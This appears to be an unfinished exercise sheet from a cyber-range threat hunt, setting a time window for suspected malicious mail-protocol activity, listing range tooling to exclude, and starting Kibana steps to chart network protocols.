   - The SOC identified a period of time on Aug 10, 2021 approximately 22:45 that may have malicious mail protocol activity.
   - The directed hunt timeframe for this investigation is Aug 10, 2021 @ 22:30 to Aug 10, 2021 @ 23:00.
- Exclude processes executables or parent processes that include the following in the executable name or as part of the execution path as they are a part of the range.
   - Simspace
   - Ruby
   - Puppet
   - ue-cmd
   - <random numbers>.bat
- Use the Discover - Elastic - Sysmon - Process and Network discover workspace, and any other available dashboard or visualization, existing or newly created, to conduct this portion of the investigation.

1. Open up Kibana, and create a visualization to display Top 20 network protocols (network.protocol.keyword)
2. 






